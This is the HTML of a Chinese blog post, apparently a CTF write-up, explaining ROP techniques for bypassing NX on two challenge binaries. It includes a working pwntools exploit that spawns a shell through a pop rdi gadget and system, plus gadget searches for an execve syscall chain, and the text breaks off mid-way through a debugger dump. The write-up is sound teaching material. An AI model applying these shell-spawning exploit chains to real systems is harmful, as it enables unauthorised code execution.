@@ -1,0 +1,2696 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>二进制安全之NX绕过方法--ROP - Hvnt3r&#39;s Blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="在之前的缓冲区溢出的实验中，溢出到栈中的shellcode可以直接被系统执行，给系统安全带来了极大的风险，因此NX技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意shellcode写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名为ROP（Return-Orient">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制安全之NX绕过方法--ROP">
+<meta property="og:url" content="https://www.hvnt3r.top/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8BROP/index.html">
+<meta property="og:site_name" content="Hvnt3r&#39;s Blog">
+<meta property="og:description" content="在之前的缓冲区溢出的实验中，溢出到栈中的shellcode可以直接被系统执行，给系统安全带来了极大的风险，因此NX技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意shellcode写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名为ROP（Return-Orient">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.hvnt3r.top/images/og_image.png">
+<meta property="article:published_time" content="2018-10-24T02:20:05.000Z">
+<meta property="article:modified_time" content="2019-05-23T03:05:17.225Z">
+<meta property="article:author" content="Hvnt3r">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.hvnt3r.top/images/og_image.png">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/favicon-32x32.ico">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/default.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/og_image.png" alt="二进制安全之NX绕过方法--ROP" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives/">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories/">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags/">标签</a>
+                
+                <a class="navbar-item"
+                href="/about/">关于我</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Hvnt3r的Github" href="https://github.com/Hvnt3r">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-10-24T02:20:05.000Z">2018-10-24</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    30 分钟 读完 (大约 4461 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                二进制安全之NX绕过方法--ROP
+            
+        </h1>
+        <div class="content">
+            <p>在之前的缓冲区溢出的实验中，溢出到栈中的<code>shellcode</code>可以直接被系统执行，给系统安全带来了极大的风险，因此<code>NX</code>技术应运而生，该技术是一种在CPU上实现的安全技术，将数据和命令进行了区分，被标记为数据的内存页没有执行权限，因此即使将恶意<code>shellcode</code>写入到执行流程中也会因缺少执行权限而利用失败，在一定程度上提高了系统的安全性，但是所有安全都是绝对的，一种名为ROP（Return-Oriented Programming）的技术就能绕过这项安全措施，ROP的核心思想是利用<code>ret</code>，<code>jmp</code>，<code>call</code>等指令（主要是<code>ret</code>）来连接代码的上下文从而改变程序执行流程的一项技术，由于ret指令的功能是将当前的栈顶数据弹出到<code>EIP</code>中并跳转执行，我们可以在栈中精心构造一些以<code>ret</code>结尾的特殊指令（gadget）使系统跳转到我们在栈中放置的指令的位置，进而执行这些指令，达到攻击的效果。</p>
+<a id="more"></a>
+
+<h2 id="64位ELF的ROP"><a href="#64位ELF的ROP" class="headerlink" title="64位ELF的ROP"></a>64位ELF的ROP</h2><p>先拿一道<code>bugs bunny ctf 2017</code>的<code>pwn150</code>来说：</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1vWo03QA2ueqN9-uzgpJaXQ">题目下载</a></p>
+<p>这是一个64位的ELF文件且程序开启了NX：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd04ad656935.png"></p>
+<p>放到IDA里可以很容易发现<code>Hello()</code>函数中存在溢出漏洞：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd04ba0a065f.png"></p>
+<p>现看一下溢出的情况，可以使用IDA的远程调试来看看再发生溢出后寄存器的数据，<a target="_blank" rel="noopener" href="https://hvnt3r.top/2018/10/IDA-Pro%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/">IDA远程调试教程</a></p>
+<p>点击运行程序，向程序中输入如下字符串：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_creat 150</span><br><span class="line"><span class="hljs-string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2018/10/25/5bd12fec4d9a7.png"></p>
+<p>回车之后IDA报错，段错误，查看此时寄存器中的数值：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd04fd9d3ed6.png"></p>
+<p>栈内数据如下：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd053257fdc5.png"></p>
+<p>此时RSP寄存器中的值为<code>41416741414B4141</code>，ASCII转化一下就是<code>AAgAAKAA</code>，按照存储方式倒序就是<code>AAKAAgAA</code>，查看偏移量为88：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset AAKAAgAA</span><br><span class="line">AAKAAgAA found at offset: 88</span><br></pre></td></tr></table></figure>
+
+<p>至此我们找到了到达RSP的距离，如果想实现<code>system(&quot;/bin/sh&quot;)</code>起shell还需要找到<code>system()</code>函数的位置和字符串<code>/bin/sh</code>，和一个<code>gadget</code>，<code>gadget</code>是指程序中我们可以利用的代码片段，由于本程序为64位程序，在运行时与32位程序不同，64位程序的前六个整型或指针参数依次保存在<code>RDI</code>，<code>RSI</code>， <code>RDX</code>，<code>RCX</code>，<code>R8</code>和<code>R9</code>这六个寄存器中，多出来的参数才会入栈，因此我们按照<code>ROP</code>的思路，需要找到的<code>gadget</code>为<code>pop rdi , ret</code></p>
+<p><code>system()</code>的位置可以在<code>main</code>函数中的一个<code>today()</code>中找到：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="hljs-number">0000000000400756</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="hljs-number">0000000000400756</span>                 push    rbp</span><br><span class="line">.text:<span class="hljs-number">0000000000400757</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="hljs-number">000000000040075</span>A                 mov     edi, offset command ; <span class="hljs-string">&quot;/bin/date&quot;</span></span><br><span class="line">.text:<span class="hljs-number">000000000040075F</span>                 call    _system</span><br><span class="line">.text:<span class="hljs-number">0000000000400764</span>                 nop</span><br><span class="line">.text:<span class="hljs-number">0000000000400765</span>                 pop     rbp</span><br><span class="line">.text:<span class="hljs-number">0000000000400766</span>                 retn</span><br><span class="line">.text:<span class="hljs-number">0000000000400766</span> ; &#125; <span class="hljs-comment">// starts at 400756</span></span><br><span class="line">.text:<span class="hljs-number">0000000000400766</span> today           endp</span><br><span class="line">.text:<span class="hljs-number">0000000000400766</span></span><br></pre></td></tr></table></figure>
+
+<p>地址为<code>000000000040075F</code></p>
+<p><code>/bin/sh</code>可以在Hello的输出语句的<code>shorry</code>中找到一个<code>sh</code></p>
+<p><img src="https://i.loli.net/2018/10/24/5bd0656667462.png"></p>
+<p>地址为<code>00000000004008fb</code></p>
+<p>本来还想着这里怎么打错了，原来是留了后门啊，也可以在函数名中找到：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd065cbcf9e8.png"></p>
+<p>地址为<code>00000000004003ef</code></p>
+<p>寻找目标<code>gadget</code>可用此程序：<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn150 | grep <span class="hljs-string">&quot;pop rdi&quot;</span></span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>找到了以上的地址，可以构造脚本了：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.update(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;, timeout &#x3D; 1)</span><br><span class="line"></span><br><span class="line">io &#x3D; process(&quot;.&#x2F;pwn150&quot;)</span><br><span class="line"></span><br><span class="line">system &#x3D; 0x40075f</span><br><span class="line">binsh &#x3D; 0x4003ef</span><br><span class="line">pop_rdi_ret &#x3D; 0x400883  </span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;A&quot;*88</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)</span><br><span class="line">payload+&#x3D;p64(binsh)</span><br><span class="line">payload+&#x3D;p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2018/10/24/5bd0681883c81.png"></p>
+<p>漏洞利用成功，再解释一下为什么 要这样构造脚本：</p>
+<p>首先发送了88个字节填充无用空间，在88个字节之后的数据<code>gadget</code>会存储在ESP所指的内存区域，此时系统会执行<code>gadget</code>的指令<code>pop rdi ; ret</code>，<code>rsp+8</code>，通过<code>pop rdi</code>将<code>/bin/sh</code>弹出到RDI寄存器中，<code>rsp+8</code>，<code>rsp</code>此时指向<code>system()</code>，之后会执行<code>ret</code>，因为此时RSP指向<code>system()</code>，系统会调用<code>system()</code>函数并将<code>rdi</code>中的值作为参数传到<code>system()</code>中从而执行<code>system(&quot;/bin/sh&quot;)</code></p>
+<h2 id="无system函数时调用int-0x80完成ROP"><a href="#无system函数时调用int-0x80完成ROP" class="headerlink" title="无system函数时调用int 0x80完成ROP"></a>无system函数时调用<code>int 0x80</code>完成ROP</h2><p>上文中的例子是程序中有system函数调用的情况，但是如果程序中没有system函数的调用应该怎么办呢？</p>
+<p>我们可以使用<code>int 0x80</code>来进行系统中断</p>
+<blockquote>
+<p>启动系统调用需要使用<code>INT</code>指令。<code>linux</code>系统调用位于中断<code>0x80</code>，执行<code>INT</code>指令时，所有操作转移到内核中的系统调用处理程序，完成后执行转移到<code>INT</code>指令之后的下一条指令。操作系统实现系统调用的基本过程是：</p>
+<ul>
+<li> 应用程序调用库函数（API）；</li>
+<li> API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；</li>
+<li> 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
+<li> 系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；</li>
+<li> 中断处理函数返回到API中；</li>
+<li> API将EAX返回给应用程序。</li>
+<li> 寄存器<code>eax</code>存放调用号，剩下的几个寄存器存放参数。</li>
+</ul>
+</blockquote>
+<p>拿<code>Tamu CTF 2018</code>的<code>pwn5</code>来说：</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1EoQurswVJNR4siSFvC_KBg">题目下载</a></p>
+<p>看一下开启的安全措施:</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
+
+<p>IDA看一下:</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd19be503ced.png"></p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">first_day_corps</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">printf</span>(</span><br><span class="line">    <span class="hljs-string">&quot;You wake with a start as your sophomore yells \&quot;Wake up fish %s! Why aren&#x27;t you with your buddies in the fallout hole?\&quot;\n&quot;</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;As your sophomore slams your door close you quickly get dressed in pt gear and go to the fallout hole.&quot;</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You spend your morning excersizing and eating chow.&quot;</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Finally your first day of class begins at Texas A&amp;M. What do you decide to do next?(Input option number)&quot;</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Go to class.\n2. Change your major.\n3. Skip class and sleep\n4. Study&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  result = (<span class="hljs-keyword">char</span>)getchar();</span><br><span class="line">  <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You decide that you are already tired of studying %s and go to the advisors office to change your major\n&quot;</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you change your major to?: &quot;</span>);</span><br><span class="line">    result = change_major();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( result &gt; <span class="hljs-number">50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">51</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="hljs-built_in">puts</span>(</span><br><span class="line">                 <span class="hljs-string">&quot;You succumb to the sweet calling of your rack and decide that sleeping is more important than class at the moment.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-built_in">puts</span>(</span><br><span class="line">        <span class="hljs-string">&quot;You realize that the corps dorms are probably not the best place to be studying and decide to go to the library&quot;</span>);</span><br><span class="line">      result = <span class="hljs-built_in">printf</span>(</span><br><span class="line">                 <span class="hljs-string">&quot;Unfortunately the queitness of the library works against you and as you are studying %s related topics &quot;</span></span><br><span class="line">                 <span class="hljs-string">&quot;you start to doze off and fall asleep\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You go to class and sit front and center as the Corps academic advisors told you to do.&quot;</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(</span><br><span class="line">      <span class="hljs-string">&quot;As the lecturer drones on about a topic that you don&#x27;t quite understand in the field of %s you feel yourself begin&quot;</span></span><br><span class="line">      <span class="hljs-string">&quot;ning to drift off.\n&quot;</span>);</span><br><span class="line">    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You wake with a start and find that you are alone in the lecture hall.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题的英文部分是真的多，分析一圈下来发现这些都是些没有什么作用的输出语句，漏洞存在于<code>change_major()</code>函数：<br><img src="https://i.loli.net/2018/10/25/5bd19cd6d73dd.png"></p>
+<p>找到漏洞之后我们可以构造ROP了，由于这个程序中没有system函数，我们需要找到<code>int 0x80</code>系统中断，可用<code>ROPgadget</code>：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn5 | grep <span class="hljs-string">&quot;int 0x80&quot;</span></span><br><span class="line">0x08071003 : add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08071001 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08071005 : int 0x80  //  &lt;=======这里</span><br><span class="line">0x08070ffe : invd ; mov eax, 1 ; int 0x80</span><br><span class="line">0x0807ed3a : ja 0x807ed40 ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080bb0a6 : js 0x80bb0b0 ; int 0x80</span><br><span class="line">0x080bb172 : js 0x80bb17b ; int 0x80</span><br><span class="line">0x08070ffc : lock or dword ptr [edi], ecx ; or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x0807ed39 : mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0807ed30 : mov eax, 0xad ; int 0x80</span><br><span class="line">0x08071000 : mov eax, 1 ; int 0x80</span><br><span class="line">0x0807398f : nop ; int 0x80</span><br><span class="line">0x0807ed2f : nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0807398e : nop ; nop ; int 0x80</span><br><span class="line">0x0807398c : nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807398a : nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x08073988 : nop ; nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807ed37 : nop ; pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x08070fff : or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x08070ffd : or dword ptr [edi], ecx ; or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x0807ed38 : pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x080bb0a7 : push es ; int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>找到int 8后需要找到执行系统调用的函数，在<a target="_blank" rel="noopener" href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/ </a>上有详细的参数，我们要调用<a target="_blank" rel="noopener" href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html"><br>sys_execve</a> ：</p>
+<figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>系统调用号<code>eax</code>应该为<code>0xb</code></li>
+<li>第一个参数<code>ebx</code>应该指向<code>/bin/sh</code>的地址，或者指向<code>sh</code>的地址</li>
+<li>第二个参数<code>ecx</code>应该为0</li>
+<li>第三个参数<code>edx</code>应该为0</li>
+</ul>
+<p>因此我们需要找到控制这几个寄存器的<code>gadget</code>如<code>pop eax ; pop ebx ; pop ecx ; pop edx ; ret</code></p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn5 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span> </span><br><span class="line">0x08095ff4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  //&lt;=====</span><br><span class="line">0x080a150a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bc396 : pop eax ; ret</span><br><span class="line">0x080a1509 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>我们可以用这一条<code>0x08095ff4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</code>，</p>
+<p>没有<code>ecx</code>，在找一下<code>pop ecx</code>：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali ROPgadget --binary pwn5 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;ecx&#x27;</span></span><br><span class="line">0x0804b99a : pop dword ptr [ecx] ; ret</span><br><span class="line">0x080733b1 : pop ecx ; pop ebx ; ret //&lt;=====</span><br><span class="line">0x080e4325 : pop ecx ; ret</span><br><span class="line">0x080733b0 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>用这一个：<code>0x080733b1 : pop ecx ; pop ebx ; ret</code></p>
+<p>寻找溢出</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1f </span><br><span class="line">EBX: 0x80481b0 (&lt;_init&gt;:	push   ebx)</span><br><span class="line">ECX: 0x7fffffe1 </span><br><span class="line">EDX: 0x80f14d4 --&gt; 0x0 </span><br><span class="line">ESI: 0x80f000c --&gt; 0x806a620 (&lt;__strcpy_sse2&gt;:	mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EDI: 0x5e (<span class="hljs-string">&#x27;^&#x27;</span>)</span><br><span class="line">EBP: 0x413b4141 (<span class="hljs-string">&#x27;AA;A&#x27;</span>)</span><br><span class="line">ESP: 0xffffd130 (<span class="hljs-string">&quot;EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">EIP: 0x41412941 (<span class="hljs-string">&#x27;A)AA&#x27;</span>)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="hljs-variable">$PC</span> address: 0x41412941</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd130 (<span class="hljs-string">&quot;EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0004| 0xffffd134 (<span class="hljs-string">&quot;AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0008| 0xffffd138 (<span class="hljs-string">&quot;AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0012| 0xffffd13c (<span class="hljs-string">&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)</span><br><span class="line">0016| 0xffffd140 (<span 